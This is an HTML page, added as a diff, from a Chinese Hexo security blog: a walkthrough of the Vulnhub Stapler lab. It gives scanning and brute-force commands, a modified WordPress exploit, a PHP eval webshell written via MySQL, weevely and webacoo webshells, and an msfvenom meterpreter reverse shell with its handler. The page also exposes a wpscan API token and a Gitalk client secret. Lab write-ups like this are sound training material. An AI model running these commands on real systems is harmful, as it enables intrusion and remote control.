@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-10stapler | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-10stapler</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:05:13</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>arp-scan -l找到靶机ip：192.168.20.3</p>
+<p>nmap -p0-65535 192.168.20.3快速扫描开放的端口号</p>
+<p>nmap -p20,21,22,53,80,123,137,138,139,666,3306,12380 -A 192.168.20.3详细扫描开放端口运行的服务，</p>
+<p><img src="/vulnhub-10stapler//1.png" alt="1"></p>
+<p>这个ftp是未授权访问，可以进行匿名登录–Anonymous</p>
+<p>dir发现有note文件，直接get note下载到电脑桌面，打开后发现Elly账号有payload，可以考虑ssh密码爆破，另外也有John账号</p>
+<p>同时也可以用kali自带的工具收集信息，比如enum4linux</p>
+<p>enum4linux -a 192.168.20.3收集到大量的账户信息</p>
+<p><img src="/vulnhub-10stapler//2.png" alt="2"></p>
+<p>就是这一堆，但是我们只需要小框里面的，可以直接让ai处理后发出来也可以要一个命令行代码，比如cat user.txt | cut -d ‘\ -f2 | cut -d ‘ ‘ -f1 &gt; user.txt</p>
+<p>用hydra进行爆破ssh&#x2F;ftp：hydra -L user.txt -P user.txt 192.168.20.3 ssh&#x2F;ftp</p>
+<p>login: SHayslett password: SHayslett—-ftp和ssh都可以登录</p>
+<p>ftp里面有大量文件可以获取信息，ssh能登录进行提取</p>
+<p>80端口没有任何东西，不过也发现有12380端口</p>
+<p>nikto -h <a target="_blank" rel="noopener" href="http://192.168.20.3:12380/">https://192.168.20.3:12380/</a> &gt;&gt;192.168.20.3</p>
+<p><img src="/vulnhub-10stapler//3.png" alt="3"></p>
+<p>&#x2F;admin112233&#x2F; &#x2F;blogbolg&#x2F;这里有两个目录，同时也开启了SSL协议</p>
+<p>wpscan –url <a target="_blank" rel="noopener" href="https://192.168.20.3:12380/blogblog/">https://192.168.20.3:12380/blogblog/</a> -e u –api-token rXPAHHYlLrF3xr50aaaFKWdIsNckML8Oqhr7sCpdJqQ –disable-tls-checks &gt;&gt; 192.168.20.3 2&gt;&amp;1</p>
+<p><img src="/vulnhub-10stapler//4.png" alt="4"></p>
+<p><img src="/vulnhub-10stapler//5.png" alt="5"></p>
+<p>扫到了登录，上传，还有插件信息</p>
+<p><img src="/vulnhub-10stapler//6.png" alt="6"></p>
+<p>搜到了相关可利用的漏洞,用39646.py但是要有修改，把http改成https，另外需要</p>
+<p>import ssl</p>
+<p>ssl._create_default_https_context &#x3D; ssl._create_unverified_context</p>
+<p><img src="/vulnhub-10stapler//7.png" alt="7"></p>
+<p>直接python2 39646.py，在上传目录发现一个图片，直接cat一下发现账号密码</p>
+<p><img src="/vulnhub-10stapler//8.png" alt="8"></p>
+<p>mysql -uroot -pplbkac -h 192.168.111.129连接mysql</p>
+<p>找到密码的字段</p>
+<p><img src="/vulnhub-10stapler//9.png" alt="9"></p>
+<p>复制粘贴到sql.txt然后</p>
+<p>通过正则表达式提取出加密的md5–awk -F’|‘ ‘{print $3}’ sql.txt &gt; sql1.txt</p>
+<p><img src="/vulnhub-10stapler//10.png" alt="10"></p>
+<p>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt sql1.txt</p>
+<p>用john字典试出来密码。结合上面知道的两个账号，用burpsuite爆破后台登录密码</p>
+<p>账号：john密码：incorrect</p>
+<p><img src="/vulnhub-10stapler//11.png" alt="11"></p>
+<p>这里肯定有一个上传的位置，可以直接传马</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php . &#x2F;这个直接点击就行</p>
+<p>weevely generate shell dayu.php</p>
+<p>&#x2F;这个需要</p>
+<p>weevely <a target="_blank" rel="noopener" href="https://192.168.1.24:12380/blogblog/wp-content/uploads/dayu.php">https://192.168.1.24:12380/blogblog/wp-content/uploads/dayu.php</a> passwd</p>
+<p>并且点一下</p>
+<p>webacoo -g -o test.php</p>
+<p>webacoo -t -u <a target="_blank" rel="noopener" href="https://192.168.1.24:12380/blogblog/wp-content/uploads/test.php">https://192.168.1.24:12380/blogblog/wp-content/uploads/test.php</a></p>
+<p>&#x2F;&#x2F;生成webshell</p>
+<p>msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.1.12 LPORT&#x3D;4455 -f raw &gt; ms.php</p>
+<p>&#x2F;&#x2F;监听</p>
+<p>msfconsole</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload php&#x2F;meterpreter_reverse_tcp</p>
+<p>set LHOST 192.168.1.12</p>
+<p>set LPORT 4455</p>
+<p>run</p>
+<p>mysql -uroot -pplbkac -h 192.168.1.24</p>
+<p>select ‘&lt;?php eval($_POST[“cmd”]);?&gt;’ into file ‘&#x2F;var&#x2F;www&#x2F;https&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;shell.php’;</p>
+<p>永恒之蓝–139端口：</p>
+<p>msfconsole</p>
+<p>search Samba —符合2017年的就几个</p>
+<p>use exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename</p>
+<p>set rhosts 192.168.1.24</p>
+<p>set rport 139</p>
+<p>run</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h2><p>uname -a 查看系统版本内核searchsploit Linux Kernel 4.4.x 根据版本内核找到可以利用的exp</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt . 将exp下载到本地</p>
+<p>我们看内容发现利用不了，只是给了我们方法</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-11skytower/">Vulnhub-11SkyTower</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-9tr0ll2/">Vulnhub-9Tr0ll2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
